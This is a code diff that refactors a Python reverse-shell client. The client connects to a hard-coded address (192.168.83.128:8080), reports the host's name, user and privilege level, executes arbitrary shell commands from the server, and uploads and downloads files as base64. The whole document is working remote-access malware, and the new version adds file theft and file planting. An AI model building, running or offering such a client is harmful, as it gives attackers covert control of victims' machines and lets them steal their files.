@@ -3,158 +3,98 @@ import os
 import subprocess
 import ctypes
 import platform
+import base64
 
-def check_admin_access():
+def check_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
-    except Exception as e:
-        return f"Error checking admin status: {e}"
-
-def get_system_info():
-    """Gather basic system information for initial connection"""
-    info = {
-        "OS": platform.system(),
-        "Version": platform.version(),
-        "Machine": platform.machine(),
-        "Hostname": platform.node(),
-        "Username": os.getlogin()
-    }
-    return info
+    except:
+        return os.geteuid() == 0 if os.name != 'nt' else False
 
 def connect():
+    client = socket.socket()
+    server_ip = "192.168.83.128"
+    server_port = 8080
+    
     try:
-        # Create socket object and connect to server
-        mySocket = socket.socket()
-        server_ip = "192.168.83.128"  # Server IP address
-        server_port = 8080            # Server port
+        client.connect((server_ip, server_port))
         
-        print(f"[*] Attempting to connect to {server_ip}:{server_port}")
-        mySocket.connect((server_ip, server_port))
+        # Send system info
+        username = os.getlogin()
+        hostname = platform.node()
+        os_name = platform.system()
+        is_admin = "Admin" if check_admin() else "Standard User"
         
-        # Send initial system information
-        sys_info = get_system_info()
-        init_message = f"Connected to {sys_info['Hostname']} - {sys_info['OS']} {sys_info['Version']} ({sys_info['Username']})"
-        mySocket.send(init_message.encode())
+        client.send(f"Connected to {hostname} - {os_name} - {username} ({is_admin})".encode())
         
-        # Start shell to process commands
-        shell(mySocket)
-        
-    except ConnectionRefusedError:
-        print("[!] Connection refused - Make sure the server is running")
-    except Exception as e:
-        print(f"[!] Connection error: {str(e)}")
-
-def shell(mySocket):
-    while True:
-        try:
-            # Receive command from server
-            command = mySocket.recv(5000).decode()
+        while True:
+            command = client.recv(1024).decode()
             
-            if not command:
-                print("[!] Empty command received, connection may be lost")
-                break
-            
-            # Handle termination command
-            if "terminate" in command:
-                print("[*] Server has requested termination")
+            if command == "terminate":
                 break
                 
-            # Handle directory listing (ls/dir command)
-            elif command == "dir":
-                try:
-                    if os.name == 'nt':  # Windows
-                        # Use dir /w for more compact output on Windows
-                        process = subprocess.Popen(
-                            "dir", 
-                            shell=True, 
-                            stdout=subprocess.PIPE, 
-                            stderr=subprocess.PIPE
-                        )
-                    else:  # Unix/Linux
-                        process = subprocess.Popen(
-                            "ls -la", 
-                            shell=True, 
-                            stdout=subprocess.PIPE, 
-                            stderr=subprocess.PIPE
-                        )
-                    stdout, stderr = process.communicate()
-                    
-                    if stdout:
-                        mySocket.send(stdout)
-                    elif stderr:
-                        mySocket.send(stderr)
-                    else:
-                        mySocket.send("Empty directory".encode())
-                except Exception as e:
-                    mySocket.send(f"Error listing directory: {str(e)}".encode())
-            
-            # Handle current directory command (pwd/cd without arguments)
-            elif command == "cd":
-                try:
-                    current_dir = os.getcwd()
-                    mySocket.send(f"Current directory: {current_dir}".encode())
-                except Exception as e:
-                    mySocket.send(f"Error getting current directory: {str(e)}".encode())
-            
-            # Handle change directory command
+            elif command == "pwd":
+                client.send(os.getcwd().encode())
+                
+            elif command == "ls":
+                cmd = "dir" if os.name == 'nt' else "ls -la"
+                result = subprocess.check_output(cmd, shell=True)
+                client.send(result)
+                
             elif command.startswith("cd "):
+                directory = command[3:]
                 try:
-                    # Extract the directory path from the command
-                    directory = command.split(' ', 1)[1].strip()
-                    # Change directory
                     os.chdir(directory)
-                    current_dir = os.getcwd()
-                    mySocket.send(f"Changed to: {current_dir}".encode())
+                    client.send(f"Changed to: {os.getcwd()}".encode())
                 except Exception as e:
-                    mySocket.send(f"Error changing directory: {str(e)}".encode())
-            
-            # Handle admin check command
-            elif command == "checkUserLevel":
-                is_admin = check_admin_access()
-                if isinstance(is_admin, bool):
-                    result = f"Admin privileges: {'YES' if is_admin else 'NO'}"
-                else:
-                    result = str(is_admin)  # If it's an error message
-                mySocket.send(result.encode())
-            
-            # Execute any other command
+                    client.send(f"Error: {str(e)}".encode())
+                    
+            elif command == "checkadmin":
+                is_admin = check_admin()
+                status = "Administrator" if is_admin else "Standard User"
+                client.send(f"User has {status} privileges".encode())
+                
+            elif command.startswith("upload "):
+                parts = command.split(" ", 2)
+                path, data = parts[1], parts[2]
+                
+                try:
+                    file_data = base64.b64decode(data)
+                    with open(path, "wb") as f:
+                        f.write(file_data)
+                    client.send(f"File uploaded to {path}".encode())
+                except Exception as e:
+                    client.send(f"Upload failed: {str(e)}".encode())
+                    
+            elif command.startswith("download "):
+                path = command.split(" ", 1)[1]
+                
+                if not os.path.exists(path):
+                    client.send(f"[!] File not found: {path}".encode())
+                    continue
+                    
+                try:
+                    client.send(f"[+] Found {path} ({os.path.getsize(path)} bytes)".encode())
+                    
+                    with open(path, "rb") as f:
+                        file_data = f.read()
+                        
+                    encoded = base64.b64encode(file_data).decode()
+                    client.send(f"BASE64:{encoded}ENDOFFILE".encode())
+                except Exception as e:
+                    client.send(f"Download failed: {str(e)}ENDOFFILE".encode())
+                    
             else:
                 try:
-                    # Execute the command and capture output
-                    process = subprocess.Popen(
-                        command, 
-                        shell=True, 
-                        stdout=subprocess.PIPE, 
-                        stderr=subprocess.PIPE
-                    )
-                    stdout, stderr = process.communicate(timeout=30)  # Add timeout
-                    
-                    # Send output or error back to server
-                    if stdout:
-                        mySocket.send(stdout)
-                    elif stderr:
-                        mySocket.send(stderr)
-                    else:
-                        mySocket.send("Command executed with no output".encode())
-                except subprocess.TimeoutExpired:
-                    process.kill()
-                    mySocket.send("Command timed out after 30 seconds".encode())
+                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    client.send(result if result else b"Command executed (no output)")
                 except Exception as e:
-                    mySocket.send(f"Command execution error: {str(e)}".encode())
-        
-        except Exception as e:
-            print(f"[!] Error in shell: {str(e)}")
-            break
+                    client.send(f"Error: {str(e)}".encode())
     
-    # Ensure socket is closed when exiting
-    try:
-        mySocket.close()
-        print("[*] Connection closed")
-    except:
-        pass
-
-def main():
-    connect()
+    except Exception as e:
+        print(f"Error: {str(e)}")
+    finally:
+        client.close()
 
 if __name__ == "__main__":
-    main()
+    connect()
